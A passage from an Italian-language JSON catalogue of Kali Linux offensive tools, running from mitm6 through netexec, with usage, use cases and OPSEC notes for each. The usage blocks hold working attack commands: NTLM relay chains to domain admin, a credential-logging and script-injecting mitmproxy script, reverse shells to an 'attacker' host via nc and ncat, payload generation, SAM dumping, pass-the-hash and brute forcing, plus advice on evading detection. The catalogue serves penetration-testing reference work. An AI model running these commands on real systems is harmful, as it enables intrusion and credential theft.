    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mitm6 sfrutta la configurazione IPv6 di default in Windows per eseguire MITM. Windows preferisce IPv6 e accetta Router Advertisement da qualsiasi sorgente. Mitm6 diventa il DNS IPv6 della rete, intercettando query DNS e relay di autenticazione NTLM.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DHCPv6:</strong> Fornisce configurazione IPv6.</p><p><strong>DNS Spoofing:</strong> Risponde a query DNS.</p><p><strong>WPAD Injection:</strong> Inietta proxy config.</p><p><strong>NTLM Relay:</strong> Integra con ntlmrelayx.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ATTACCO BASE: NTLM RELAY A LDAP ===\n# Terminal 1: mitm6 spoofing\nmitm6 -d corp.local -i eth0\n\n# Terminal 2: ntlmrelayx per creare computer account (RBCD)\nntlmrelayx.py -6 -wh attacker.corp.local -t ldaps://dc.corp.local --delegate-access -l loot/\n\n# === ESC8: ADCS RELAY (Privilege Escalation to DA) ===\n# Prerequisiti: CA con Web Enrollment abilitato\n# Terminal 1: mitm6\nmitm6 -d corp.local --ignore-nofqdn\n\n# Terminal 2: ntlmrelayx a ADCS per richiedere certificato\nntlmrelayx.py -6 -wh attacker.corp.local \\\n  -t http://ca.corp.local/certsrv/certfnsh.asp \\\n  --adcs --template DomainController\n\n# Risultato: certificato del DC\n# Usa certificato per autenticazione\ncertipy auth -pfx dc.pfx -dc-ip 10.10.10.1\n\n# === RELAY A SMB (Remote Code Execution) ===\n# Relay a target SMB per eseguire comandi\nmitm6 -d corp.local\nntlmrelayx.py -6 -wh attacker -t smb://target.corp.local -c \"whoami > C:\\\\pwned.txt\"\n\n# === TARGETING SPECIFICO ===\n# Solo certi host (meno rumore)\nmitm6 -d corp.local --filter-host workstation01,workstation02\n\n# Ignora host specifici (evita detection su server monitorati)\nmitm6 -d corp.local --ignore-host dc01,dc02\n\n# === ATTACK CHAIN COMPLETA ===\n# 1. mitm6 cattura autenticazione workstation\nmitm6 -d corp.local\n\n# 2. Relay a LDAP per RBCD attack\nntlmrelayx.py -6 -wh attacker -t ldaps://dc.corp.local --delegate-access\n\n# 3. Output: EVILPC$ computer account creato\n# 4. Usa RBCD per impersonare admin\ngetST.py -spn cifs/target.corp.local corp.local/EVILPC$ -impersonate Administrator\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.local/Administrator@target.corp.local\n\n# === MONITORING MODE ===\n# Solo osserva traffico DHCPv6 senza rispondere\nmitm6 -d corp.local --ignore-nofqdn -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, relay credentials per accesso privilegiato. <strong>ADCS Attacks (ESC8)</strong>, ottenere certificati di Domain Controller. <strong>RBCD</strong>, creare machine account per impersonation. <strong>Red Team</strong> per initial foothold in rete interna.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> DHCPv6 traffic anomalo su reti IPv4-only. Microsoft Defender for Identity rileva NTLM relay. ADCS relay genera Event ID 4768. Usare filtering per ridurre rumore. Funziona solo se SMB Signing non è enforced.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mitmproxy",
    "name": "mitmproxy",
    "version": "12.1.2",
    "icon": "../app/icons/mitmproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitmproxy/",
    "desc": "Proxy HTTP interattivo per intercettare, modificare e replay di traffico web e API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mitmproxy è un proxy HTTP/HTTPS interattivo per intercettare, ispezionare, modificare e replay di traffico. Include TUI (mitmproxy), web interface (mitmweb), e scripting Python (mitmdump). Perfetto per debug API, security testing, e analisi di app mobile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercept:</strong> Cattura tutto il traffico HTTP/S.</p><p><strong>Modify:</strong> Altera request/response on-the-fly.</p><p><strong>Replay:</strong> Rigioca traffico catturato.</p><p><strong>Script:</strong> Automazione con Python.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === MODALITÀ BASE ===\nmitmproxy                    # TUI interattiva\nmitmweb                      # Web interface su :8081\nmitmdump -w traffic.flow     # Dump su file\n\n# === TRANSPARENT PROXY (senza config client) ===\n# Setup iptables per redirect traffico\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nmitmproxy --mode transparent --showhost\n\n# === INTERCEPT FILTERS ===\n# Intercetta solo API specifiche\nmitmproxy --intercept \"~u /api/ &amp; ~m POST\"\n# Ignora asset statici\nmitmproxy --ignore-hosts \".*\\.googleapis\\.com|.*\\.gstatic\\.com\"\n\n# === PYTHON SCRIPTING ===\n# inject_payload.py - Inject XSS in tutte le response\nfrom mitmproxy import http\ndef response(flow: http.HTTPFlow):\n    if flow.response and \"text/html\" in flow.response.headers.get(\"content-type\", \"\"):\n        flow.response.text = flow.response.text.replace(\"&lt;/body&gt;\", '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;/body&gt;')\n\n# credential_logger.py - Log tutte le credenziali\nfrom mitmproxy import http\nimport json\ndef request(flow: http.HTTPFlow):\n    if flow.request.method == \"POST\":\n        body = flow.request.get_text()\n        if any(k in body.lower() for k in [\"password\", \"passwd\", \"pwd\", \"token\"]):\n            with open(\"creds.log\", \"a\") as f:\n                f.write(f\"{flow.request.pretty_url}\\n{body}\\n\\n\")\n\nmitmdump -s inject_payload.py\nmitmdump -s credential_logger.py -w creds.flow\n\n# === MOBILE APP TESTING ===\n# Proxy su tutte le interfacce\nmitmproxy --listen-host 0.0.0.0 -p 8080\n# Installa CA su device: http://mitm.it\n\n# SSL Pinning Bypass (con Frida)\nfrida -U -f com.target.app -l ssl_bypass.js --no-pause\nmitmproxy --ssl-insecure  # Ignora errori cert\n\n# === REPLAY E FUZZING ===\n# Salva flow specifico\nmitmdump -w login.flow \"~u /api/login\"\n# Replay con modifiche\nmitmdump -n -r login.flow --modify-body \"/password:.*/password:fuzzed/\"\n\n# === REVERSE PROXY MODE ===\n# Proxy davanti a backend (per testing)\nmitmproxy --mode reverse:http://backend:8080\n\n# === UPSTREAM PROXY (Burp chain) ===\nmitmproxy --mode upstream:http://127.0.0.1:8081</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>API Testing</strong>, debug e modifica di API call. Nel <strong>Mobile Security</strong>, analisi traffico app con SSL pinning bypass. <strong>Web Pentesting</strong> per credential harvesting e payload injection automatizzata. <strong>Red Team</strong> per MITM on-path attacks.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM Position:</strong> Richiede controllo del traffico (ARP spoof, DNS spoof, o gateway). Certificate warning sui client senza CA installata. Tutti i dati transitano in chiaro sul proxy - proteggere i log.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "msfpc",
    "name": "msfpc",
    "version": "1.4.5",
    "icon": "../app/icons/msfpc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/msfpc/",
    "desc": "Genera payload Metasploit rapidamente con wizard interattivo e output multi-formato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MSFPC (MSFvenom Payload Creator) semplifica la generazione di payload Metasploit. Wizard interattivo guida nella scelta di piattaforma, tipo di shell, encoding e formato output. Genera payload in tutti i formati supportati da msfvenom con un singolo comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wizard:</strong> Generazione guidata passo-passo.</p><p><strong>Multi-format:</strong> EXE, ELF, APK, PS1, Python, etc.</p><p><strong>Auto-handler:</strong> Genera anche handler msfconsole.</p><p><strong>Encoding:</strong> Applica encoder automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Wizard interattivo\nmsfpc\n\n# Quick generate Windows reverse shell\nmsfpc windows 192.168.1.100 4444\n\n# Linux payload\nmsfpc linux 192.168.1.100 4444\n\n# Android APK\nmsfpc apk 192.168.1.100 4444\n\n# Output include payload + handler.rc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Payload</strong>, generazione rapida senza memorizzare sintassi. Nel <strong>Learning</strong>, capire opzioni msfvenom. <strong>CTF</strong> per payload veloci.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come msfvenom:</strong> Payload Metasploit sono molto detectati. Necessario encoding/crypting aggiuntivo. Signature note a tutti gli AV.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "mssqlpwner",
    "name": "mssqlpwner",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mssqlpwner/",
    "desc": "Sfrutta linked server MSSQL per privilege escalation e lateral movement via SQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MSSQLPwner sfrutta linked server e altre feature di Microsoft SQL Server per privilege escalation e lateral movement. Enumera link tra server, esegue query attraverso chain di linked server, e può ottenere code execution sfruttando xp_cmdshell e altre stored procedure.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Link Enumeration:</strong> Mappa linked server.</p><p><strong>Link Crawling:</strong> Query attraverso chain.</p><p><strong>Privilege Escalation:</strong> Da user a sysadmin.</p><p><strong>Code Execution:</strong> xp_cmdshell, OLE automation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera linked server\nmssqlpwner -d domain -u user -p pass -t mssql.target.com enum\n\n# Crawl tutti i link\nmssqlpwner -d domain -u user -p pass -t mssql.target.com crawl\n\n# Esegui comando via link\nmssqlpwner -t mssql.target.com exec -q \"xp_cmdshell 'whoami'\"\n\n# Privilege escalation\nmssqlpwner -t mssql.target.com privesc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Database Exploitation</strong>, movimento tra SQL Server. Nel <strong>AD Pentesting</strong>, spesso MSSQL ha link privilegiati. <strong>Lateral Movement</strong> via database.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Loggabile:</strong> Query SQL loggabili. xp_cmdshell genera eventi. Link traversal visibile. Audit SQL Server può rilevare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "mxcheck",
    "name": "mxcheck",
    "version": "1.7.0",
    "icon": "../app/icons/mxcheck-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mxcheck/",
    "desc": "Verifica configurazione MX record e test di connessione SMTP per domini email.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MXCheck verifica la configurazione dei record MX di un dominio e testa la connettività SMTP ai mail server. Identifica problemi di configurazione DNS, mail server non raggiungibili, open relay, e altre misconfiguration che possono essere sfruttate o causare problemi di deliverability.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MX Lookup:</strong> Risolve tutti i record MX.</p><p><strong>SMTP Test:</strong> Verifica connessione ai mail server.</p><p><strong>Priority Check:</strong> Analizza priorità MX.</p><p><strong>Relay Test:</strong> Identifica open relay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check configurazione MX\nmxcheck target.com\n\n# Test SMTP dettagliato\nmxcheck -v target.com\n\n# Verifica specifico mail server\nmxcheck -s mail.target.com target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Email Recon</strong>, mappa infrastruttura mail. Nel <strong>Security Assessment</strong>, trova misconfiguration. <strong>Troubleshooting</strong> problemi email.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Basso rumore:</strong> Query DNS e connessioni SMTP standard. Non invia email. Simile a traffico diagnostico normale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "naabu",
    "name": "naabu",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/naabu/",
    "desc": "Port scanner veloce scritto in Go, ottimo per discovery su larga scala con output JSON.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Naabu è un port scanner veloce sviluppato da ProjectDiscovery in Go. Ottimizzato per discovery su larga scala, integra perfettamente con altri tool della suite (httpx, nuclei). Supporta SYN/CONNECT scan, output JSON, e validazione con Nmap per massima affidabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast:</strong> Scan veloce con goroutines.</p><p><strong>SYN/CONNECT:</strong> Entrambe le modalità.</p><p><strong>Nmap Verify:</strong> Validazione risultati con Nmap.</p><p><strong>JSON Output:</strong> Integrazione pipeline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nnaabu -host target.com\n\n# Top 100 porte\nnaabu -host target.com -top-ports 100\n\n# Con output JSON\nnaabu -host target.com -json -o results.json\n\n# Pipeline con httpx\nnaabu -host target.com -silent | httpx\n\n# Da lista\nnaabu -list hosts.txt -p 80,443,8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty</strong>, discovery veloce in scope ampi. Nel <strong>Recon</strong>, alternativa veloce a Nmap. <strong>Pipeline</strong> con tool ProjectDiscovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attivo:</strong> Scanning visibile come qualsiasi port scanner. Rate limiting configurabile. User-agent e source port customizzabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "name-that-hash",
    "name": "name-that-hash",
    "version": "1.11.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/name-that-hash/",
    "desc": "Identifica automaticamente il tipo di hash analizzando pattern e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Name-That-Hash identifica automaticamente il tipo di hash analizzando lunghezza, charset, e pattern. Supporta 300+ tipi di hash e fornisce comandi pronti per Hashcat e John the Ripper. Essenziale quando si trovano hash sconosciuti durante un engagement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>300+ Hash Types:</strong> Ampio database di formati.</p><p><strong>Confidence:</strong> Probabilità per ogni match.</p><p><strong>Hashcat/John:</strong> Comandi pronti per cracking.</p><p><strong>API:</strong> Integrazione programmatica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Identifica hash singolo\nnth -t '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# Da file\nnth -f hashes.txt\n\n# Solo risultati più probabili\nnth -t 'HASH' --accessible\n\n# JSON output\nnth -t 'HASH' --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Hash Cracking</strong>, identifica tipo prima di craccare. Nel <strong>CTF</strong>, riconosce hash sconosciuti. <strong>Forensics</strong> per analisi di credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi completamente locale. Nessun network traffic. Hash non vengono inviati da nessuna parte.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "nasty",
    "name": "nasty",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nasty/",
    "desc": "Tool per recupero chiavi PGP da keyserver pubblici tramite query avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nasty recupera chiavi PGP da keyserver pubblici (SKS, keys.openpgp.org). Esegue query avanzate per trovare chiavi associate a email, nomi o ID specifici. Utile per OSINT per identificare chiavi crittografiche di target e potenziali email associate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Keyserver Query:</strong> Cerca su server pubblici.</p><p><strong>Email Search:</strong> Trova chiavi per email.</p><p><strong>ID Lookup:</strong> Ricerca per key ID.</p><p><strong>Download:</strong> Scarica chiavi trovate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca chiavi per email\nnasty -e target@domain.com\n\n# Per nome\nnasty -n \"John Doe\"\n\n# Per key ID\nnasty -k 0x12345678\n\n# Specifica keyserver\nnasty -s keys.openpgp.org -e target@domain.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, trova email associate a chiavi PGP. Nel <strong>Research</strong>, identifica chiavi crittografiche di target. <strong>Verification</strong> di identità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Query a keyserver pubblici. Informazioni già pubbliche. Keyserver possono loggare query.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "nbtscan-unixwiz",
    "name": "nbtscan-unixwiz",
    "version": "1.0.35",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan-unixwiz/",
    "desc": "Scanner NetBIOS per identificare sistemi Windows e share di rete in subnet locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NBTScan-unixwiz è uno scanner NetBIOS per discovery di sistemi Windows su reti locali. Invia query NetBIOS Name Service (porta 137/UDP) per identificare hostname, workgroup/domain, e MAC address. Versione Unix del classico tool Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Scan:</strong> Query UDP parallele.</p><p><strong>Hostname:</strong> Identifica nomi NetBIOS.</p><p><strong>Workgroup:</strong> Rileva domain/workgroup.</p><p><strong>MAC Address:</strong> Estrae indirizzo fisico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan subnet\nnbtscan-unixwiz 192.168.1.0/24\n\n# Con risoluzione DNS\nnbtscan-unixwiz -v 192.168.1.0/24\n\n# Output verbose\nnbtscan-unixwiz -q 192.168.1.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Discovery</strong>, trova host Windows. Nel <strong>AD Recon</strong>, mappa workstation e server. <strong>Internal Pentesting</strong> per enumeration iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Broadcast:</strong> Traffico NetBIOS visibile. IDS può rilevare scan. Normal per ambienti Windows ma anomalo se non atteso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "nbtscan",
    "name": "nbtscan",
    "version": "1.7.2",
    "icon": "../app/icons/nbtscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan/",
    "desc": "Scansione NetBIOS per discovery di hostname, workgroup e utenti su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NBTScan scansiona reti per informazioni NetBIOS. Identifica hostname, workgroup/domain membership, utenti loggati, e MAC address di sistemi Windows. Veloce e affidabile per discovery iniziale in ambienti Windows/Active Directory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NetBIOS Query:</strong> Porta 137/UDP.</p><p><strong>User Detection:</strong> Utenti loggati.</p><p><strong>Service Flags:</strong> Tipo di servizio NetBIOS.</p><p><strong>Batch Mode:</strong> Scansione di range.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan subnet\nnbtscan 192.168.1.0/24\n\n# Human readable\nnbtscan -h 192.168.1.0/24\n\n# Con verbose\nnbtscan -v 192.168.1.0/24\n\n# Da file\nnbtscan -f targets.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Windows Discovery</strong>, identifica sistemi in rete. Nel <strong>AD Enumeration</strong>, mappa domain membership. <strong>Pentesting</strong> per recon iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Visibile:</strong> Query NetBIOS su broadcast. Pattern riconoscibile. Normale in ambienti Windows enterprise ma loggabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "ncat-w32",
    "name": "ncat-w32",
    "version": "5.59beta1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncat-w32/",
    "desc": "Versione Windows di Ncat per trasferimenti di file e shell remote su target Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ncat-w32 è la versione Windows di Ncat (netcat moderno). Binario standalone che funziona su Windows senza dipendenze. Usato per trasferimenti file, bind/reverse shell, e tunneling su sistemi Windows compromessi. Più potente del netcat originale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP/UDP:</strong> Connessioni entrambi i protocolli.</p><p><strong>SSL/TLS:</strong> Connessioni criptate.</p><p><strong>Shell:</strong> Bind e reverse shell.</p><p><strong>Proxy:</strong> Supporto SOCKS e HTTP proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Reverse shell su victim Windows\nncat.exe -e cmd.exe attacker 4444\n\n# Listener su attacker\nncat -lvnp 4444\n\n# Transfer file\n# Receiver: ncat -lvnp 8888 > file.exe\n# Sender: ncat.exe target 8888 < file.exe\n\n# Con SSL\nncat.exe --ssl -e cmd.exe attacker 4444</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-exploitation</strong>, shell su Windows. Nel <strong>File Transfer</strong>, upload/download tool. <strong>Pivoting</strong> attraverso host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> AV può flaggare ncat.exe. Network connection visibile. Process ncat.exe sospetto. Rinominare e offuscare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "ncrack",
    "name": "ncrack",
    "version": "0.7",
    "icon": "../app/icons/ncrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncrack/",
    "desc": "Brute forcer di rete ad alte prestazioni per SSH, RDP, FTP, Telnet e altri protocolli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ncrack è un brute forcer di rete ad alte prestazioni sviluppato dal team Nmap. Ottimizzato per affidabilità e velocità, supporta SSH, RDP, FTP, Telnet, HTTP, SMB, e altri protocolli. Design modulare e timing adattivo per evitare detection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocol:</strong> SSH, RDP, FTP, SMB, etc.</p><p><strong>Adaptive Timing:</strong> Si adatta alle risposte.</p><p><strong>Parallel:</strong> Connessioni multiple.</p><p><strong>Resume:</strong> Riprende sessioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force\nncrack -p 22 --user admin -P passwords.txt target.com\n\n# RDP\nncrack -p 3389 --user administrator -P pass.txt target.com\n\n# Multiple services\nncrack target.com:22,21,3389\n\n# Da Nmap output\nncrack -iX nmap_scan.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Audit</strong>, test di credenziali. Nel <strong>Pentesting</strong>, brute force servizi. <strong>Security Assessment</strong> di password policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Molti tentativi di login. Account lockout. Rilevabile da IDS/SIEM. Timing flags aiutano a ridurre rumore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "netcat",
    "name": "netcat",
    "version": "1.10",
    "icon": "../app/icons/netcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netcat/",
    "desc": "Swiss army knife delle reti: connessioni TCP/UDP, trasferimenti file e shell di base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netcat è lo Swiss Army knife delle reti. Utility fondamentale per connessioni TCP/UDP, trasferimenti file, port scanning base, e shell. Presente su quasi ogni sistema Unix, è il tool più versatile per operazioni di rete semplici e debugging.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP/UDP:</strong> Client e server.</p><p><strong>Port Scan:</strong> Scanning base di porte.</p><p><strong>File Transfer:</strong> Pipe di dati binari.</p><p><strong>Shell:</strong> Bind e reverse shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener\nnc -lvnp 4444\n\n# Connect\nnc target.com 4444\n\n# Reverse shell\nnc -e /bin/bash attacker 4444\n\n# File transfer (receiver)\nnc -lvnp 8888 > received_file\n# (sender)\nnc target 8888 < file_to_send\n\n# Port scan\nnc -zv target 1-1000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Shell</strong>, reverse e bind shell semplici. Nel <strong>Debug</strong>, test di connettività. <strong>File Transfer</strong> rapido tra host.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Comune:</strong> Tool standard su sistemi Unix. Connessioni non criptate. -e flag non sempre disponibile. Traffic visibile in chiaro.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "netdiscover",
    "name": "netdiscover",
    "version": "0.21",
    "icon": "../app/icons/netdiscover-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netdiscover/",
    "desc": "Scanner ARP attivo/passivo per identificare host live su reti locali switched.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netdiscover è uno scanner ARP per discovery di host su reti locali. Funziona in modalità attiva (invia ARP request) o passiva (sniffa traffico ARP). Perfetto per reti switched dove ICMP ping può essere filtrato. Mostra IP, MAC e vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Active Mode:</strong> Invia ARP request.</p><p><strong>Passive Mode:</strong> Sniffa ARP passivamente.</p><p><strong>Vendor Detection:</strong> Identifica produttore da MAC.</p><p><strong>Live Update:</strong> Aggiorna in tempo reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan attivo\nnetdiscover -r 192.168.1.0/24\n\n# Passivo (stealth)\nnetdiscover -p\n\n# Interfaccia specifica\nnetdiscover -i eth0 -r 10.0.0.0/24\n\n# Fast mode\nnetdiscover -f -r 192.168.1.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Host Discovery</strong>, trova host su LAN. Nel <strong>Wireless Pentesting</strong>, mappa client connessi. <strong>Passive Recon</strong> senza generare traffico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Variabile:</strong> Modo attivo genera traffico ARP. Modo passivo è invisibile. ARP è layer 2, non routabile. Rilevabile da switch port security.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "netexec",
    "name": "netexec",
    "version": "1.4.0",
    "icon": "../app/icons/netexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netexec/",
    "desc": "Successore di CrackMapExec per pentesting AD: SMB, WinRM, LDAP, MSSQL execution.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NetExec (nxc) è il successore ufficiale di CrackMapExec. Tool essenziale per pentesting Active Directory: enumeration, execution, credential spraying su SMB, WinRM, LDAP, MSSQL, SSH, RDP. Include moduli per dumping, lateral movement e post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocol:</strong> SMB, WinRM, LDAP, MSSQL, SSH.</p><p><strong>Credential Spray:</strong> Test password su multipli host.</p><p><strong>Execution:</strong> Remote code execution.</p><p><strong>Modules:</strong> Mimikatz, SAM dump, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Password spray SMB\nnxc smb 192.168.1.0/24 -u user -p password\n\n# Enumeration LDAP\nnxc ldap dc.target.com -u user -p pass --users\n\n# WinRM execution\nnxc winrm target.com -u admin -p pass -x 'whoami'\n\n# Dump SAM\nnxc smb target -u admin -p pass --sam\n\n# Pass-the-hash\nnxc smb target -u admin -H NTHASH</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, enumeration e exploitation. Nel <strong>Red Team</strong>, lateral movement. <strong>Credential Testing</strong> su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Login events 4624/4625. SMB/WinRM traffic loggato. Spray genera molti eventi. EDR può rilevare 